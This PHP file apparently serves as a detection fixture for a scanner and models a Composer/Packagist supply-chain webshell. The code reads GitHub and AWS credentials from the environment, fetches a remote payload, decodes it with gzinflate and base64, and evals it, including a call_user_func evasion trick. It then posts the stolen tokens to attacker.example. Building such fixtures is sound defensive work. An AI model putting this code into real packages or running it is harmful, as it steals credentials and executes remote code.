<?php
// Generic shape of a Packagist supply-chain attack — the canonical
// PHP webshell pattern observed across multiple compromised libraries
// (rest-client / Composer typosquats / hijacked maintainer accounts).
//
// The library auto-loads bootstrap.php; that file:
//   1. reads CI tokens from env
//   2. fetches a remote payload via HTTP
//   3. base64/gzinflate-decodes it
//   4. eval()s the result
// — the entire chain runs at `composer install` time.
//
// Detection target:
//   - shell-spawn      (escapeshellarg call kept for completeness)
//   - dynamic-eval     (eval + call_user_func)
//   - base64-decode    (gzinflate(base64_decode(...))  webshell chain)
//   - net-egress       (file_get_contents with http://, curl_init)
//   - env-read         (getenv, $_ENV, $_SERVER)
//   - suspicious-url   (pastebin.com via host-blocklist)

$token   = getenv("GITHUB_TOKEN");
$awsKey  = $_ENV["AWS_ACCESS_KEY_ID"];
$awsSec  = $_SERVER["HTTP_AUTHORIZATION"];

$payload = file_get_contents("https://pastebin.com/raw/abc123");

// Canonical webshell decode chain.
$decoded = gzinflate(base64_decode($payload));

// Then eval() the result. Optionally proxied through call_user_func
// to dodge naive grep-based AV.
eval($decoded);
call_user_func('eval', $decoded);

// Exfiltrate the harvested env vars.
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://attacker.example/exfil");
curl_setopt($ch, CURLOPT_POSTFIELDS, "t={$token}&k={$awsKey}&a={$awsSec}");
curl_exec($ch);
